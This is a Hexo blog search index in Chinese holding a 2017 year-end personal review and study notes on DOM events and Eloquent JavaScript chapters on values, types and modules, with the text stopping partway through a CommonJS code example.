<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2017年年终总结</title>
    <url>/2017/12/28/17%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>一直以来都想自己搭建个博客来记录下自己的学习历程和生活点滴，本来是想要用PHP从头搭建一个博客系统，不过刚好在这段时间在学习Vue，在很偶然的机会下，知道了Hexo这个博客搭建框架，便去繁从简，索性阅读了官方文档，打算以此记录下自己的学习历程。时间刚好到了2017年年底，便打算将对2017年的总结作为博客的第一篇文章。<a id="more"></a></p>
<h3 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h3><p>在2017年年初的时候，一个很偶然的机会下，我知道了JavaScript这门编程语言，了解到这是一个负责网站前端表现的脚本语言。由于一直以来对视觉表现美的追求，我渐渐地对网站的实现产生了浓厚的兴趣。于是，和大多数人一样，在慕课网上首先学习了基础的HTML和CSS，但是慕课网的HTML和CSS的教程相对基础，只是讲解了一些HTML和CSS中一些基本的规则，对一些需要深入理解的知识并未面面俱到。后来知道了百度前端技术学院这个平台，遂利用所学的HTML和CSS完成了前几个网页实现的作业。后来，意识到HTML和CSS并不是编程语言，因而开始了对于JS的学习。在拜读了《JavaScript Dom 编程艺术》，《JavaScript高级程序设计》之后，陆续做了百度前端学院和Freecodecamp上面的一些原生JS项目。渐渐感觉原生代码是如此繁琐，刚好在阅读别人博客的过程中，知道了一些库和框架的存在，最开始接触的是jQuery，通过阅读《锋利的jQuery》一书基本了解了jQuery的一些用法，深感开发可以如此便捷，也因此意识到不断学习新技术的重要性，往往原生JS中几行代码，通过jQuery一行就可以完成，实在是为开发人员带来了诸多便利。2017年的十月份，参加了校内某俱乐部的面试，当时给出的题目是一个“打飞机”游戏的JS实现，于是在完成题目的过程中，学习了Canvas的基本操作以及一些碰撞检测算法的实现。在后来验收的过程中，被问到对于JS框架的学习，虽然之前有听说过当下主流三大JS框架，但并没有深入学习，便决定回去之后选择其中一个来学习，最终还是从同为国人的尤雨溪开发的Vue开始了我对JS框架的学习，在对Vue的学习中，渐渐地被Vue的易用性、灵活性、高效性所吸引，并且对模块化开发有了一定的认识，也陆续接触了Webpack，Babel，Node这些当下比较流行的技术。</p>
<p>总之，2017年里，在保证自己自动化学业课程完成的情况下，完成了对JS基础以及一些库和框架使用的学习。2018年里，还要继续巩固JS基础的学习以及ES6新语法，Nodejs, React等的学习，紧跟当下技术发展的方向，同时要恶补因非科班出身而较缺失的数据结构与算法知识，初步建立自身的学习体系。</p>
<h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><p>从2015年年底开始弹吉他开始，大约也有两年的时间了，从最初几个和弦的弹唱到创作，再到如今发展为对音乐本身的学习，我想大概是因为真的热爱。从十岁那年听的人生中第一次单曲循环的逍遥叹开始，也过去了十二个春秋。十二年来，听的音乐的风格在不断地变化，渐渐感觉到有些时候，话语往往显得过分苍白，于是便渐渐地想要用音乐去表达一些东西。所幸在大学期间加入了吉协，认识到了一些很有创作才能的朋友，也从他们身上学到了许多东西。今年参加的新声代在聆听大家歌唱的时候，也在不断感受不同的人对音乐的表达。而最要庆幸的是，在比赛的过程中认识了康师傅，精彩的键盘表演让我对音乐有了新的理解，也藉此想要更加系统的学习音乐，遂买了电子琴，一切从零开始。</p>
<p>2018年，在学习基本音乐理论的同时，预期学习《勋伯格和声学》，《作曲基本原理》，在音乐的学习路上洒一腔热爱。</p>
<p>一首原创歌曲</p>
<iframe src="//music.163.com/outchain/player?type=3&id=901554058&auto=1&height=66" width="330" height="86" frameborder="0" loading="lazy" allowfullscreen></iframe>

<h3 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h3><p>2017年，遇见了很多的人，经历了许多的事，大概是个可爱的一年吧。</p>
<p>*1月在疾驰的火车上看绿叶渐渐被霜染<br>在长春的街头<br>在铁岭的夜里<br>2月是家乡脚下的寒凉<br>3月是紫荆的喜欢<br>4月是日落黄昏的海上<br>静静在等待暮色降临的繁星<br>5月是海岛三人远去的背影<br>6月在塘前月色下静待花开<br>7月是塞北的石窟佛前下的肃穆<br>午夜的小摊里诉说着平凡<br>在金雕飞起的乌兰察布<br>却也未曾经过大草原的湖边<br>8月是夏日中故乡的清凉<br>9月天边拂晓下的微笑<br>也不再寂寥<br>10月是十九大背景下的不忘初心<br>11月是灯光背后的谢绝尘嚣<br>12月是考试月<br>*</p>
<p>2017 年 12月 29日    </p>
]]></content>
      <categories>
        <category>年终总结</category>
      </categories>
      <tags>
        <tag>年终总结</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM</title>
    <url>/2018/01/12/DOM%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<p>这一章主要学习DOM事件相关知识</p>
<ul>
<li>基本概念：DOM事件级别</li>
<li>DOM事件模型</li>
<li>DOM事件流</li>
<li>描述DOM事件捕获的具体流程</li>
<li>Event对象的常见应用</li>
<li>自定义事件</li>
</ul>
<a id="more"></a>

<hr>
<h3 id="DOM节点"><a href="#DOM节点" class="headerlink" title="DOM节点"></a>DOM节点</h3><p>整个文档都是由不同的节点组成的，共有12种不同的节点类型，通过nodeType可以查看节点的类型，但我们经常使用的只有四种。元素为1，文本为3，注释为8，文档（document）为9。（空白折行会产生文本节点。）</p>
<h2 id="节点名称通过nodeName属性获取，"><a href="#节点名称通过nodeName属性获取，" class="headerlink" title="节点名称通过nodeName属性获取，"></a>节点名称通过nodeName属性获取，</h2><h3 id="DOM事件的级别"><a href="#DOM事件的级别" class="headerlink" title="DOM事件的级别"></a>DOM事件的级别</h3><ul>
<li><p>DOM0：element.onclick=function(){}</p>
</li>
<li><p>DOM2: element.addEventListener(‘click’,function(){},false)</p>
<p>第三个参数表明是在捕获阶段还是冒泡阶段触发，如果是false也就是默认情况下是在冒泡阶段触发，如果是true就是在捕获阶段触发。</p>
</li>
<li><p>DOM3: element.addEventListener(‘keyup’,function(){},false)</p>
<p>  主要是新增了一些鼠标键盘事件</p>
</li>
</ul>
<hr>
<h3 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h3><ul>
<li><p>事件捕获：自上而下</p>
</li>
<li><p>事件冒泡：自下而上</p>
</li>
</ul>
<hr>
<h3 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h3><p>事件是如何传播到页面的？首先事件通过捕获到达目标元素，目标元素再上传到window对象。</p>
<hr>
<h3 id="DOM捕获的流程"><a href="#DOM捕获的流程" class="headerlink" title="DOM捕获的流程"></a>DOM捕获的流程</h3><p>(document.body可以获取body元素，但是html元素要通过document.documentElement)<br>window -&gt; document -&gt; html -&gt; body…-&gt;目标元素</p>
<p>冒泡流程刚好相反</p>
<hr>
<h3 id="Event对象"><a href="#Event对象" class="headerlink" title="Event对象"></a>Event对象</h3><ul>
<li><p>event.preventDefault()<br>阻止默认行为</p>
</li>
<li><p>event.stopPropagation()<br>阻止冒泡，子元素绑定的事件会冒泡到父元素，有的时候我们不需要这种效果，就需要阻止冒泡。</p>
</li>
<li><p>event.stopImmediatePropagation()<br>在一个元素上绑定两个事件响应函数的时候，可以避免另一个事件的响应</p>
</li>
<li><p>event.currentTarget</p>
<p>是指注册了事件监听器的对象，是target的父级对象，比如我们点击的时候，父级元素注册了事件监听器，在事件冒泡的过程中，currentTarget就可能是父级注册了事件监听器的那个元素。</p>
</li>
<li><p>event.target</p>
<p>多个子元素的事件绑定到父级元素上，即为事件代理，通过target获取当前点击的子元素</p>
</li>
</ul>
<hr>
<h3 id="DOM操作"><a href="#DOM操作" class="headerlink" title="DOM操作"></a>DOM操作</h3><ul>
<li>css样式：元素.style.cssName = cssValue;</li>
<li>获取元素：document.getElementById(id)、document.getElementsByTagName(tagName);</li>
<li>添加自定义属性：setAttribute(name,value);</li>
<li>获取自定义属性：getAttribute(name);</li>
<li>获取标准属性：元素打点调用;</li>
</ul>
<hr>
<h3 id="自定义事件（模拟事件）"><a href="#自定义事件（模拟事件）" class="headerlink" title="自定义事件（模拟事件）"></a>自定义事件（模拟事件）</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> eve = <span class="keyword">new</span> Event(<span class="string">'custom'</span>);</span><br><span class="line">ev.addEventListener(<span class="string">'custom'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'custom'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 派发事件</span></span><br><span class="line">ev.dispatchEvent(eve);</span><br></pre></td></tr></table></figure>

<p>CustomEvent对象还可以指定参数</p>
<hr>
<hr>
<p>2018 年 1月 12日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>EJ1</title>
    <url>/2018/12/18/EJ1/</url>
    <content><![CDATA[<h1 id="值，类型和操作符"><a href="#值，类型和操作符" class="headerlink" title="值，类型和操作符"></a>值，类型和操作符</h1><h2 id="值"><a href="#值" class="headerlink" title="值"></a>值</h2><p>值表示为二进制位存储在计算机易失内存中，每种值对应一种类型，</p>
<a id="more"></a>
<h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><p>JS中数字表示为64位二进制浮点数，遵循IEEE 754标准，0位到51位表示小数部分，52到62表示指数，第63位表示符号位，所以实际的可表示的整数不足2^64个(18后面18个0)，大概是9后面15个0，当然也是特别大的。可用<code>9.81</code>这种表示法，也可以用科学计数法，e后面是指数，如<code>2.998e8</code>，整数运算在上面整数范围可以保证精确性，小数运算可能是不精确的，小数的存储只能是一种近似的妥协。</p>
<p>这篇文章很好的解释了JS中数字的内部表示<a href="http://2ality.com/2012/04/number-encoding.html" target="_blank" rel="noopener">numbers represention in javascript</a></p>
<h2 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h2><p>包括<code>+-*/%</code>四种运算，运算顺序取决于优先级，可以加括号改变优先级，乘除取模运算优先级一致。</p>
<h2 id="特殊数字"><a href="#特殊数字" class="headerlink" title="特殊数字"></a>特殊数字</h2><p>首先要提到<code>Infinity</code>和<code>-Infinity</code>，分别代表正无穷和负无穷，不要过多依赖关于无穷的运算，否则很容易产生下一个特殊数字<code>NaN</code>，代表非数字(Not a number)，<code>0/0</code>和<code>Infinity-Infinity</code>这种运算以及任何产生无意义的算术运算都会生成<code>NaN</code>。</p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>可用单引号，双引号和反引号表示字符串，只需要对应前后匹配即可。</p>
<p>对于一些特殊字符，比如引号，放在字符串中比较困难。当按下回车键产生的<code>NEWLINE</code>字符在不转义的情况下只能被包含在反引号中间。</p>
<p>解决方案是用反斜线<code>\</code>符号转义后面紧跟的字符，比如<code>\n``\t</code>分别代表换行和tab字符。如果想包含<code>\</code>在字符串中，需要对<code>\</code>转义，两个紧挨着的<code>\</code>在最终的显示结果中只会显示一个<code>\</code>。下面的例子是“A newline character is written like “\n”.”的字符串表示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"A newline character is written like \"\\n\"."</span></span><br></pre></td></tr></table></figure>

<p>字符串要被编码成二进制数字位存储在计算机中，JS基于Unicode标准实现了字符串的存储。Unicode标准中，每种字符都被编码成一个数字，故此字符串作为字符的组合可以被表示位二进制数字位。但是JS中对字符的表示为16位二进制数字，最多只能表示2^16个字符，但是Unicode定义了差不多两倍多的字符。所以如一些emoji在JS中占据了两个“字符位置”，第五章还会再说。</p>
<p>乘除和减法操作无法运用在字符串上，加法运算是可以的，在字符串环境下表示字符串的拼接。第四章会讲述字符串数据类型的方法。</p>
<p>单引号和双引号包裹的字符串除了内部需要转义的字符不同之外没有其他区别。反引号包裹的字符串，也叫做模板字符串，可以有很多有意思的操作，不仅可以纵跨几行而且可以嵌入其他值。比如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">`half of 100 is <span class="subst">$&#123;<span class="number">100</span> <span class="regexp">/ 2&#125;`</span></span></span></span><br></pre></td></tr></table></figure>
<p>当包含在大括号中一些表达式时，结果会被运算并插入到原位置，对于这个例子的结果是<code>“half of 100 is 50”</code>。</p>
<h2 id="一元操作符"><a href="#一元操作符" class="headerlink" title="一元操作符"></a>一元操作符</h2><p>除了符号表示的操作符，还有些单词表示的操作符，典型的如typeof，生成操作数的类型。涉及两个操作数的操作符叫做二元操作符，一个操作数叫一元操作符。<code>-</code>既可以是一元操作符也可以是二元操作符。</p>
<h2 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h2><p>数字比较大小可以产生布尔值，字符串也可以比较大小，比如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Aardvark"</span> &lt; <span class="string">"Zoroaster"</span>)</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>
<p>字符串的大小比较在JS中的做法是从左至右扫描，比较Unicode码，大写字符要小于小写字母，各种标点符号也被包含在字符串的比较中，并不是严格的按照字典序。</p>
<p>其他比较的操作包括大于等于，小于等于，等于(==)和不等于(!=)。比如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Itchy"</span> != <span class="string">"Scratchy"</span>)</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Apple"</span> == <span class="string">"Orange"</span>)</span><br><span class="line"><span class="comment">// → false</span></span><br></pre></td></tr></table></figure>

<p>只有一个值在JS中不等于自己，就是<code>NaN</code>。<code>NaN</code>的意义就是表示任何无意义的计算结果，所以不应等于其他无意义的计算结果。</p>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>包含<code>&amp;&amp;</code>与<code>||</code>或<code>!</code>非。只有非是一元操作符，与或是二元操作符，具有短路效应。</p>
<p>混合数学表达式的时候，不太看得出什么时候需要括号。所以重提优先级，或运算优先级最低，与运算高一点，然后比较运算符更高一点，然后是其他运算符。这样的设计是为了保证像下面的例子中的情况保证括号尽可能的少。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="number">1</span> == <span class="number">2</span> &amp;&amp; <span class="number">10</span> * <span class="number">10</span> &gt; <span class="number">50</span></span><br></pre></td></tr></table></figure>

<p>还有个三元运算符值得注意，就是三目运算符。如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="literal">true</span> ? <span class="number">1</span> : <span class="number">2</span>);</span><br><span class="line"><span class="comment">// → 1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">false</span> ? <span class="number">1</span> : <span class="number">2</span>);</span><br><span class="line"><span class="comment">// → 2</span></span><br></pre></td></tr></table></figure>

<h2 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h2><p>有两个特殊值是<code>null</code>和<code>underfined</code>，被用于表示无意义的值，不带有任何信息。许多操作不产生一个有意义的值都会生成一个underfined因为必须产生一个值。</p>
<p>两者的区别是JS设计的一个意外，大多数情况下没什么区别。</p>
<h2 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h2><p>JS对程序的容错率很高，即便有时候给很怪异的程序，也会正常执行，如下面的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">8</span> * <span class="literal">null</span>)</span><br><span class="line"><span class="comment">// → 0</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"5"</span> - <span class="number">1</span>)</span><br><span class="line"><span class="comment">// → 4</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"5"</span> + <span class="number">1</span>)</span><br><span class="line"><span class="comment">// → 51</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"five"</span> * <span class="number">2</span>)</span><br><span class="line"><span class="comment">// → NaN</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">false</span> == <span class="number">0</span>)</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>
<p>当一个运算符被运用到错误的类型时，JS会悄悄地转换成他需要的类型，而且并不是那么像人期望的那样，这叫做类型强转(type coercion)。第一个表达式null转为0，第二个中字符串5转为数字5，第三个数字1转换为字符串1并做了拼接操作。</p>
<p>当有一些并不能显然的转为数字的值被转为数字类型时，就会得到<code>NaN</code>这个数字类型值，<code>NaN</code>的后续运算还会一直得到<code>NaN</code>。</p>
<p>比较不同类型的值的相等性又有着一套令人迷惑的规则。基本规则是转换其中一个值的类型为另外一种类型，然而，当null或者underfined出现在某一方时，当且仅当另一侧也是null或者underfined的时候才会返回true，如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="literal">null</span> == <span class="literal">undefined</span>);</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">null</span> == <span class="number">0</span>);</span><br><span class="line"><span class="comment">// → false</span></span><br></pre></td></tr></table></figure>

<p>这个特性十分的有用，比如当你想测试一个值是不是有一个真实存在的值而不是null或者underfined，可以把它和null进行比较，用<code>==</code>或者<code>!=</code>。</p>
<p>但有时候想确确实实地知道一个值是不是false，这时候三等号就派上了用场，===的比较不会进行类型强转，所以如：<code>false === &#39;&#39;</code>就会返回false，如果两等号就返回true。</p>
<p>最好用三等号保证类型，除非特别肯定两侧的类型相同。</p>
<h2 id="逻辑运算符的短路效应"><a href="#逻辑运算符的短路效应" class="headerlink" title="逻辑运算符的短路效应"></a>逻辑运算符的短路效应</h2><p>逻辑与和逻辑或处理不同类型的值，首先会将左侧的值转为布尔值类型，然后根据操作符的类型决定接下来的动作，要么返回原始的左侧的值或者返回右侧的值。</p>
<p>或运算符，如果左侧可以转为true则返回左侧值，否则返回右侧值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="literal">null</span> || <span class="string">"user"</span>)</span><br><span class="line"><span class="comment">// → user</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Agnes"</span> || <span class="string">"user"</span>)</span><br><span class="line"><span class="comment">// → Agnes</span></span><br></pre></td></tr></table></figure>

<p>我们可以利用这种特性做一个回退到默认值机制。如果一个值可能是空值，可以让它或上一个替代值。当前者为null或者underfined时，后面的值就会获得。对于数字，只有0和NaN转化为false，对于字符串，只有空字符串转化为false，其余情况都是true。如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> || <span class="number">-1</span></span><br><span class="line"><span class="comment">// -&gt; -1</span></span><br><span class="line"><span class="string">""</span> || <span class="string">"!-"</span></span><br><span class="line"><span class="comment">// -&gt; "!-"</span></span><br></pre></td></tr></table></figure>
<p>逻辑与正好相反，若左边的转为false，直接返回左侧的值，否则返回右侧的值。</p>
<p>还有逻辑与和逻辑或只做必要的求值。对于与运算符，左侧为false就不计算右侧表达式，对于或运算符，左侧为true就不执行右侧表达式计算了。同样的，三目运算符也只是对选中的表达式做计算。插个题外话，SICP中有一道模拟if语句的题目，考察的就是if语句和if函数的差异，if函数会计算所有结果，而if语句只做有必要的求值。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们学习了四种类型：数字，字符串，未定义值和布尔值。还有一些一元操作符（逻辑非和数字取反），比较运算符，逻辑运算符（与和或），三目运算符等，这一章可以利用JS做个计算器用了，下一张开始用这些写基本的程序。</p>
]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ10</title>
    <url>/2019/01/08/EJ10/</url>
    <content><![CDATA[<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>理想的程序有一个如水晶般清澈的结构。他工作的方式很容易去解释，并且每部分都扮演着精心定义的角色。</p>
<p>一个典型的真正的程序是有机增长的。随着新需求的诞生新功能被添加。结构和保留结构是额外的工作。只有在未来，下一次某人继续这项工作的时候才会有回报。所以很容易忽视它并让程序的部分陷入困境。</p>
<p>这导致了两个实践上的问题。首先，理解这样的系统是苦难你的。如果所有事物可以触碰所有其他的事物，很难孤立地去看待某个给定的部分。你被迫要构建对于整个事物的全盘的理解。其次，如果你想要在其他的环境下从这样的程序中使用任何的功能，重写它可能比将其从它的上下文中抽离出来更加容易。</p>
<p>短语“一个大泥球”经常被用于这样巨大无结构的程序。任何事物粘连在一起，当你想要抽取其中一部分时，整个东西就散了，你的手就会变脏。</p>
<a id="more"></a>

<h2 id="模块-1"><a href="#模块-1" class="headerlink" title="模块"></a>模块</h2><p>模块是一种避免这些问题的尝试。一个模块就是一小段程序，指明它所依赖的其他部分以及它可以给别的模块提供的功能（它的接口）。</p>
<p>模块接口和对象接口有很多类似之处，如同我们第六章看到的那样。它们使得模块的部分可以对外界公开，并保持其余部分私有。通过限制模块与彼此交互的方式，这个系统表现得就像乐高，每一块通过精心定义的连接器彼此交互，不像泥巴，所有的东西混在了一起。</p>
<p>模块之间的关系叫做依赖。当一个模块需要另一个模块的部分时，我们说它依赖那个模块。当这个事实清晰地在模块本身中指明时，他可以被用作当使用给定模块时哪一个模块需要被呈现出来并且自动加载依赖项。</p>
<p>为了以那种方式分离模块，每一个需要它自己的私有作用域。</p>
<p>仅仅将你的JS代码分散在不同的文件不能满足这个要求。文件仍然共享同样的命名空间。它们可以有意的或者意外地，与彼此的绑定冲突。并且依赖结构变得不清晰。我们可以做的更好，如同我们后面看到的那样。</p>
<p>为程序设计一个适合的模块结构是很困难的。在你仍然探索问题的阶段，尝试不同的东西去看看什么工作，你可能不想过分担心这个问题因为这使人严重分神。一旦你感觉基础很坚实了，那就是回头看看并且组织它的好时机。</p>
<h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><p>从独立的部分构建一个程序，并且实际上可以独立运行这些部分的优点之一就是你可以在不同的程序中使用相同的部分。</p>
<p>但是你怎么操作这个呢？假设我想要在另外的程序中使用第九章的<code>parseINI</code>函数。如果我已经知道这个函数明确依赖什么，那么我就可以复制所有必要的代码到我的项目中并且使用它。但是如果我发现了那个代码中的错误，我将可能要修复任何使用它的程序并可能会遗忘某个程序。</p>
<p>一旦你开始写重复的代码了，你将很快发现自己在重复复制并且让他们与时俱进上浪费太多时间精力。</p>
<p>这就是包大显身手的地方。一个包就是一大块可以被分发的代码（复制和粘贴）。它可能包含一个或者模块并且拥有它所依赖包的信息。一个包也通常和文档一起出现，文档解释包的用途并使得非包作者也能知道如何使用这个包。</p>
<p>当包中出现问题或者新特性被添加的时候，这个包被升级。现在依赖它的程序（也可能是包）可以升级到新版本。</p>
<p>以这种方式工作需要基础设施。我们需要一个存储和发现包的地方和一种便捷的方式去安装和升级他们。在JS的世界，这个基础设施由<em>NPM</em>提供。</p>
<p>NPM是有两种含义：一个在线服务让别人下载或者上传包，以及一个程序（和Node.js打包）帮助你安装和管理它们。</p>
<p>在写作的时候，可在NPM上获取超过五十万个不同的包。我不得不说它们中的大部分都是垃圾，但是差不多所有有用的公共可获取的包都可以在上面找到。例如，<em>INI</em>文件解析器，相似于我们第九章构建的那个。可在包名为<em>ini</em>下获得。</p>
<p>第20章将会给你展示如何在本地使用<em>npm</em>命令行程序安装这些包。</p>
<p>拥有可供下载的高质量软件包是非常有价值的。这意味着通常我们只需要按几个键就可以避免重新造一个100个人可能已经写过的程序并且得到一个稳定的测试良好的实现。</p>
<p>软件的复制成本很低，所以一旦有人已经写过了，将其分发给别人是一个高效的过程。但是首先书写代码就需要经历，并且回应那些在代码中发现问题的人或者那些想要提议新功能的人要花费更多的精力。</p>
<p>默认地，你拥有你所写代码的版权，并且其他人只有获得你的许可才可以使用它。但是因为有些人特别好并且因为发布一个好的软件可以使你在程序员圈中更有名气，所以许多包在一个明确允许其他人使用的许可下发布。</p>
<p>大多数在NPM上的包以这种方式被授权。有些许可证还要求您发布在同一许可证下的包之上构建的代码。其他的就没有这么苛求，仅仅需要你分发代码的时候保持授权。JS社区大多数使用后者的许可。当使用其他人的包的时候，确保你意识到它们的许可。</p>
<h2 id="即兴的模块"><a href="#即兴的模块" class="headerlink" title="即兴的模块"></a>即兴的模块</h2><p>直到2015年，JS还没有内建的模块系统。尽管人们已经通过JS构建大型系统十几年了，它们确实需要模块。</p>
<p>所以他们在其他语言之上设计了他们的模块系统。你可以使用JS函数去创建本地作用域，使用对象表示模块接口。</p>
<p>这是一个在星期和数字之间转换的模块（Date的getDay方法）。它的接口包含<code>weekDay.name</code>和<code>weekday.number</code>，并且在立即执行的函数表达式作用域中隐藏了局部绑定<code>names</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> weekDay = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> names = [<span class="string">"Sunday"</span>, <span class="string">"Monday"</span>, <span class="string">"Tuesday"</span>, <span class="string">"Wednesday"</span>, <span class="string">"Thursday"</span>, <span class="string">"Friday"</span>, <span class="string">"Saturday"</span>];</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        name(number) &#123;<span class="keyword">return</span> names[number];&#125;,</span><br><span class="line">        number(name) &#123;<span class="keyword">return</span> names.indexOf(name);&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(weekDay.name(weekDay.number(<span class="string">"Sunday"</span>)));</span><br><span class="line"><span class="comment">// → Sunday</span></span><br></pre></td></tr></table></figure>

<p>这种风格的模块在一定程度上提供了隔离，但它没有声明依赖关系。相反，它只是将接口置于了全局作用域并期望它如果有任何依赖的话，做相同的事情。很长一段时间里，这都是web编程的主要方法，但是现在大多已淘汰了。</p>
<p>如果我们想使得依赖关系成为代码的一部分，我们必须空值加载依赖（loading dependencies）。做这个需要能够将字符串执行为代码。JS可以这么做。</p>
<h2 id="将数据作为代码执行"><a href="#将数据作为代码执行" class="headerlink" title="将数据作为代码执行"></a>将数据作为代码执行</h2><p>有几种方式将数据（一串代码）作为程序部分运行。</p>
<p>最显而易见的方式就是特殊操作符<code>eval</code>，将会在当前作用域执行一个字符串。这通常是一个坏主意，因为它打破了作用域通常具有的一些属性，例如很容易预测给定绑定的引用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evalAndReturnX</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">eval</span>(code);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(evalAndReturnX(<span class="string">"var x = 2"</span>));</span><br><span class="line"><span class="comment">// -&gt; 2</span></span><br><span class="line"><span class="built_in">console</span>.log(x);</span><br><span class="line"><span class="comment">// -&gt; 1</span></span><br></pre></td></tr></table></figure>
<p>一种不那么可怕的将数据翻译为代码的方式是使用<code>Function</code>构造器。它接受两个参数：一个包含逗号分隔的参数名字列表符串和一个包含函数体的字符串。它将代码包装在函数值种，如此一来它获得自己的作用域并且不会对其他作用域做奇怪的事情。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> plusOne = <span class="built_in">Function</span>(<span class="string">"n"</span>, <span class="string">"return n + 1;"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(plusOne(<span class="number">4</span>));</span><br></pre></td></tr></table></figure>

<p>这就是我们想在模块系统中想要的东西。我们可以将模块代码包装在函数中并且使用那个函数作用域作为模块作用域。</p>
<h2 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h2><p>最广泛使用的JS模块方法被叫做CommonJS模块。Node.js使用它并且也是NPM上大多数包采用的模块系统。</p>
<p>CommonJS模块的主要概念是一个叫做<code>require</code>的函数。当用一个依赖的模块名字调用这个函数时，他将确保模块被加载并返回它的接口。</p>
<p>因为加载器在函数中包装模块代码，模块自动获取它们自己的全局作用域。他们需要做的就是调用<code>require</code>来获得它们的依赖并将他们的接口绑定到<code>exports</code>对象。</p>
<p>例子模块提供了一个日期格式化函数。它使用了NPM上的两个包，<em>ordinal</em>来转换数字到类似于”1st”和”2nd”之类的字符串，以及<em>date-names</em>来获得平日和月份的英语名字。它输出一个函数，<code>formatDate</code>接受一个<code>Date</code>对象和一个模板字符串。</p>
<p>模板字符串包含指导格式的代码，如<code>YYYY</code>获取全年和<code>Do</code>来获取月份的天。你可以给定一个类似<code>MMMM Do YYYY</code>来获得这样的输出”November 22nd 2017”。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ordinal = <span class="built_in">require</span>(<span class="string">"ordinal"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;days, months&#125; = <span class="built_in">require</span>(<span class="string">"date-names"</span>);</span><br><span class="line"></span><br><span class="line">exports.formatDate = <span class="function"><span class="keyword">function</span>(<span class="params">date, format</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> format.replace(<span class="regexp">/YYYY|M(MMM)?|Do?|dddd/g</span>, tag =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (tag == <span class="string">"YYYY"</span>) <span class="keyword">return</span> date.getFullYear();</span><br><span class="line">    <span class="keyword">if</span> (tag == <span class="string">"M"</span>) <span class="keyword">return</span> date.getMonth();</span><br><span class="line">    <span class="comment">// 获得的月份刚好做数组索引</span></span><br><span class="line">    <span class="keyword">if</span> (tag == <span 